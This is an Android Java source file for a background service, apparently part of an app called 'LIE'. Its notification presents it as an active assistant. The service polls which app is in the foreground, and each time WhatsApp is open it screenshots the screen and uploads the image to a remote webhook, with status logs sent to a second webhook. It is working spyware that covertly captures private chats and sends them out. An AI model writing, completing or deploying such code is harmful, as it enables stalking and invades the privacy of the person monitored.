package com.truth;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import androidx.core.app.NotificationCompat;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.util.List;
import java.util.SortedMap;
import java.util.TreeMap;

public class BackgroundService extends Service {
    private static final String TAG = "BackgroundService";
    private static final String CHANNEL_ID = "LIE_CHANNEL";
    private static final String WHATSAPP_PKG = "com.whatsapp";

    private final Handler handler = new Handler(Looper.getMainLooper());
    private boolean isMonitoring = false;

    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private int screenWidth, screenHeight, screenDensity;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(1, buildNotification());

        DisplayMetrics metrics = new DisplayMetrics();
        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        if (wm != null) {
            wm.getDefaultDisplay().getRealMetrics(metrics);
            screenWidth = metrics.widthPixels;
            screenHeight = metrics.heightPixels;
            screenDensity = metrics.densityDpi;
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "LIE Monitoring", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("LIE")
                .setContentText("Asistente activo")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.hasExtra("projection_intent")) {
            int resultCode = intent.getIntExtra("projection_result_code", -1);
            Intent projData = intent.getParcelableExtra("projection_intent");

            // Obtain the MediaProjection token ONCE here — it is single-use on Android 10+
            if (projData != null && mediaProjection == null) {
                MediaProjectionManager mpManager =
                        (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
                if (mpManager != null) {
                    mediaProjection = mpManager.getMediaProjection(resultCode, projData);
                }
            }
        }
        if (!isMonitoring) {
            startMonitoring();
        }
        return START_STICKY;
    }

    private void startMonitoring() {
        isMonitoring = true;
        handler.postDelayed(monitoringRunnable, 5000);
        WebhookManager.sendMessage(WebhookManager.WEBHOOK_LOGS, "LOG", "Servicio iniciado correctamente");
    }

    private final Runnable monitoringRunnable = new Runnable() {
        @Override
        public void run() {
            String topApp = getTopPackageName();
            if (WHATSAPP_PKG.equals(topApp)) {
                Log.d(TAG, "WhatsApp detected in foreground!");
                WebhookManager.sendMessage(WebhookManager.WEBHOOK_LOGS, "WHATSAPP", "App en primer plano detectada");
                takeScreenshot();
            }
            handler.postDelayed(this, 10000);
        }
    };

    private String getTopPackageName() {
        UsageStatsManager usm = (UsageStatsManager) getSystemService(Context.USAGE_STATS_SERVICE);
        if (usm == null) return "";
        long time = System.currentTimeMillis();
        List<UsageStats> stats = usm.queryUsageStats(
                UsageStatsManager.INTERVAL_DAILY, time - 60 * 1000, time);
        if (stats == null || stats.isEmpty()) return "";
        SortedMap<Long, UsageStats> sorted = new TreeMap<>();
        for (UsageStats s : stats) sorted.put(s.getLastTimeUsed(), s);
        return sorted.isEmpty() ? "" : sorted.get(sorted.lastKey()).getPackageName();
    }

    private boolean isCapturing = false;

    private void takeScreenshot() {
        if (mediaProjection == null) {
            Log.e(TAG, "No MediaProjection available. Skipping screenshot.");
            WebhookManager.sendMessage(WebhookManager.WEBHOOK_LOGS, "LOG", "Error: no projection token");
            return;
        }
        if (isCapturing) {
            Log.d(TAG, "Already capturing, skipping.");
            return;
        }
        isCapturing = true;

        try {
            imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2);
            virtualDisplay = mediaProjection.createVirtualDisplay("LIE-Capture",
                    screenWidth, screenHeight, screenDensity,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    imageReader.getSurface(), null, null);

            imageReader.setOnImageAvailableListener(reader -> {
                Image image = reader.acquireLatestImage();
                if (image == null) return;

                FileOutputStream fos = null;
                try {
                    Image.Plane[] planes = image.getPlanes();
                    ByteBuffer buffer = planes[0].getBuffer();
                    int pixelStride = planes[0].getPixelStride();
                    int rowStride = planes[0].getRowStride();
                    int rowPadding = rowStride - pixelStride * screenWidth;

                    Bitmap bitmap = Bitmap.createBitmap(
                            screenWidth + rowPadding / pixelStride,
                            screenHeight,
                            Bitmap.Config.ARGB_8888);
                    bitmap.copyPixelsFromBuffer(buffer);

                    File dir = getExternalFilesDir(null);
                    if (dir == null) dir = getCacheDir();
                    File file = new File(dir, "shot_" + System.currentTimeMillis() + ".png");
                    fos = new FileOutputStream(file);
                    bitmap.compress(Bitmap.CompressFormat.PNG, 90, fos);
                    fos.flush();

                    Log.d(TAG, "Screenshot saved: " + file.getAbsolutePath());
                    WebhookManager.sendImage(
                            WebhookManager.WEBHOOK_IMAGES,
                            "SCREENSHOT",
                            "WhatsApp - captura automática",
                            file);
                } catch (IOException e) {
                    Log.e(TAG, "Error writing screenshot file", e);
                    WebhookManager.sendMessage(WebhookManager.WEBHOOK_LOGS, "LOG",
                            "Error al guardar captura: " + e.getMessage());
                } finally {
                    if (fos != null) {
                        try { fos.close(); } catch (IOException ignored) {}
                    }
                    image.close();
                    releaseVirtualDisplay();
                    isCapturing = false;
                }
            }, handler);

        } catch (Exception e) {
            Log.e(TAG, "Failed to take screenshot", e);
            WebhookManager.sendMessage(WebhookManager.WEBHOOK_LOGS, "LOG",
                    "Error al capturar pantalla: " + e.getMessage());
            isCapturing = false;
        }
    }

    private void releaseVirtualDisplay() {
        if (virtualDisplay != null) { virtualDisplay.release(); virtualDisplay = null; }
        if (imageReader != null) { imageReader.close(); imageReader = null; }
    }

    private void stopProjection() {
        releaseVirtualDisplay();
        if (mediaProjection != null) { mediaProjection.stop(); mediaProjection = null; }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isMonitoring = false;
        handler.removeCallbacks(monitoringRunnable);
        stopProjection();
    }
}
